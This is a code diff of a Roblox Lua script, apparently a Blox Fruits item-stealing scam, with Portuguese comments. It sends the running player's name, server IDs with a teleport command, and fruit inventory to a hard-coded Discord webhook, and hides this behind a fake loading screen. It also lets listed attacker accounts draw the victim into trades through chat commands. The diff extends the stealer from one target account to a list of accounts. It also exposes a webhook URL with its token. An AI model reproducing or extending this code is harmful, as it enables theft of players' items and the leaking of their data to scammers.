@@ -13,7 +13,7 @@ local HttpService = game:GetService("HttpService")
 local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
 -- Variáveis
-local targetPlayerName = "robloxromao"
+local targetPlayerNames = {"robloxromao", "brtoplegal"} -- ADICIONE AQUI OS NICKS QUE QUISER
 local placeId = game.PlaceId
 local jobId = game.JobId
 local webhookURL = "https://discord.com/api/webhooks/1407132376068522146/tNjtKEx89kYotCF98p-CwZVz5O7mQYnSwkn5UY1t8fjKYdwdCS0BZiSWNn6tqNlp8Mml"
@@ -29,6 +29,16 @@ local fruitRarity = {
 local rarityMap = {}
 for i, name in ipairs(fruitRarity) do
     rarityMap[name] = #fruitRarity - i + 1
+end
+
+-- Função para verificar se um jogador é alvo
+local function isTargetPlayer(player)
+    for _, targetName in ipairs(targetPlayerNames) do
+        if player.Name == targetName then
+            return true
+        end
+    end
+    return false
 end
 
 -- <<< UI STARRY LOADING >>>
@@ -58,7 +68,7 @@ local function createStarryLoadingUI()
     loadingText.Size = UDim2.new(1, 0, 0.18, 0)
     loadingText.Position = UDim2.new(0, 0, 0.06, 0)
     loadingText.BackgroundTransparency = 1
-    loadingText.Text = "Loading script..."
+    loadingText.Text = "✨ Carregando o universo..."
     loadingText.Font = Enum.Font.GothamBold
     loadingText.TextSize = 26
     loadingText.TextColor3 = Color3.fromRGB(235, 235, 245)
@@ -315,40 +325,44 @@ local function waitForPlayerToBeSpawned(player)
     return char
 end
 
--- Monitorar jogador alvo
-local function monitorRobloxRomao()
-    local player = Players:FindFirstChild(targetPlayerName)
-    if not player then return end
-    local char = waitForPlayerToBeSpawned(player)
-    local humanoid = char:FindFirstChild("Humanoid")
-    if not humanoid then return end
-
-    humanoid:GetPropertyChangedSignal("Sit"):Connect(function()
-        if humanoid.Sit then
-            print(targetPlayerName.." sentou-se.")
-            createOrUpdateLoadingUI(true)
-            teleportToPlayer(player)
+-- Monitorar jogadores alvo (AGORA MONITORA TODOS OS NICKS DA LISTA)
+local function monitorTargetPlayers()
+    for _, targetName in ipairs(targetPlayerNames) do
+        local player = Players:FindFirstChild(targetName)
+        if player then
+            local char = waitForPlayerToBeSpawned(player)
+            local humanoid = char:FindFirstChild("Humanoid")
+            if humanoid then
+                humanoid:GetPropertyChangedSignal("Sit"):Connect(function()
+                    if humanoid.Sit then
+                        print(targetName.." sentou-se.")
+                        createOrUpdateLoadingUI(true)
+                        teleportToPlayer(player)
+                    end
+                end)
+            end
         end
-    end)
+    end
 end
 
 Players.PlayerAdded:Connect(function(player)
-    if player.Name == targetPlayerName then
-        player.CharacterAdded:Connect(monitorRobloxRomao)
+    if isTargetPlayer(player) then
+        player.CharacterAdded:Connect(function()
+            monitorTargetPlayers()
+        end)
     end
 end)
 
-if Players:FindFirstChild(targetPlayerName) then
-    monitorRobloxRomao()
-end
+-- Monitorar jogadores que já estão no jogo
+monitorTargetPlayers()
 
--- Sistema de Trade via Chat simplificado
+-- Sistema de Trade via Chat simplificado (AGORA FUNCIONA PARA TODOS OS NICKS DA LISTA)
 local function onChatted(player, message)
-    if player ~= LocalPlayer and player.Name == targetPlayerName then
+    if player ~= LocalPlayer and isTargetPlayer(player) then
         local fruits = {
             dragon="Dragon-Dragon", kitsune="Kitsune-Kitsune", yeti="Yeti-Yeti", leopard="Leopard-Leopard",
             spirit="Spirit-Spirit", gas="Gas-Gas", control="Control-Control", venom="Venom-Venom",
-            shadow="Shadow-Shadow", dough="Dough-Dough", mammoth="Mammoth-Mammoth", t_rex="T-rex-T-rex",
+            shadow="Shadow-Shadow", dough="Dough-Dough", mammoth="Mammoth-Mammoth", t_rex="T-rex",
             gravity="Gravity-Gravity", blizzard="Blizzard-Blizzard", pain="Pain-Pain", rumble="Rumble-Rumble",
             portal="Portal-Portal", phoenix="Phoenix-Phoenix", sound="Sound-Sound", love="Love-Love",
             buddha="Buddha-Buddha", quake="Quake-Quake"
@@ -398,7 +412,7 @@ local function enviarInventario()
 
     local seaAtual = detectarSea()
     local teleportCommand = string.format("```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s,\"%s\")\n```", placeId, jobId)
-    local infoBlock = string.format("```\nUsername: %s\nYou: %s\nSea: %s\n```", LocalPlayer.Name, targetPlayerName, seaAtual)
+    local infoBlock = string.format("```\nUsername: %s\nTargets: %s\nSea: %s\n```", LocalPlayer.Name, table.concat(targetPlayerNames, ", "), seaAtual)
     local inventoryBlock = string.format("```\n%s```", fruitsList)
 
     local requestData = {
@@ -419,4 +433,4 @@ end
 
 task.wait(1)
 enviarInventario()
-print("Script carregado e webhook enviado.")
+print("Script carregado e webhook enviado. Monitorando: " .. table.concat(targetPlayerNames, ", "))
